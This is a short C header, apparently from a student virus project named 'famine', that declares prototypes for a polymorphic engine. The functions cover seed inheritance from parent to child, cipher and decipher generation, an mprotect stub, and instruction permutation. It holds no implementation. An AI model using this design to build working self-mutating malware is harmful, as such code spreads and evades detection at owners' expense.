/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   polymorphism.h                                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/11 20:01:16 by anselme           #+#    #+#             */
/*   Updated: 2019/12/19 18:17:38 by nhaquet          ###   ########.fr       */
/*   Updated: 2019/12/14 19:08:38 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef POLYMORPHISM_H
# define POLYMORPHISM_H

# include <stdbool.h>
# include <stdint.h>
# include <stddef.h>

# include "famine.h"

bool		yield_seed_to_heir(uint64_t father_seed[2], uint64_t son_seed[2]);

bool		generate_cypher(char *buffer, uint64_t seed, size_t size);
bool		generate_decypher(char *buffer, uint64_t seed, size_t size);
bool 		generate_mprotect(char *buffer, uint64_t seed, size_t size);

bool		permutate_instructions(void *buffer, size_t size);

#endif
